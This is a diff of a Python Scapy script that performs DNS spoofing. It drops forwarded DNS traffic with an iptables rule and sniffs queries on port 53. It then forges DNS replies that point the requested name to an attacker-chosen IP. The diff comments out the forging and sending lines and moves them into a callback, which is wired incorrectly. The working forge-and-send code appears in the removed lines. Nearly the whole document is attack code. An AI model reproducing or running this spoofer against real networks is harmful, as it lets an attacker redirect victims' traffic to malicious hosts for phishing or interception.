@@ -14,11 +14,17 @@ gotoIP = input()
 firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
 Popen([firewall], shell=True, stdout=PIPE)
 
+def dnsspoof(IP):
+    if IP.haslayer(DNS) and IP.getlayer(DNS).qr==0:
+        print("yeah")
+        #spoof = IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
+        #sendp(spoof, verbose=1)
+
+
+
 while True:
-    a=sniff(count=1, filter="udp port 53")
-    if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
-        spoof = IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
-        sendp(spoof, verbose=1)
+    a=sniff(prn = dnsspoof(IP),count=1, filter="udp port 53")
+    
 
 
         
